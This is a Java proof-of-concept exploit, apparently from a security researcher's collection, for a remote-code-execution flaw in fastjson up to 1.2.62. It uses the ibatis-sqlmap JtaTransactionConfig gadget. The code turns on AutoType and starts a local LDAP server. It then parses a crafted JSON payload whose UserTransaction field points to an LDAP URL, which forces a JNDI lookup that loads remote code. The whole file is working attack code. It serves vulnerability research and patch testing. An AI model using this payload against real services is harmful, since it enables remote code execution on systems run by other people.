package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to 阿里云先知众测 - 内部已知)
 *
 * <dependency>
 *       <groupId>org.apache.ibatis</groupId>
 *       <artifactId>ibatis-sqlmap</artifactId>
 *       <version>2.3.4.726</version>
 * </dependency>
 *
 * <dependency>
 *       <groupId>javax</groupId>
 *       <artifactId>javaee-api</artifactId>
 *       <version>8.0.1</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class IbatisSqlmapPoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}";//ldap方式
    JSON.parse(payload);
  }
}
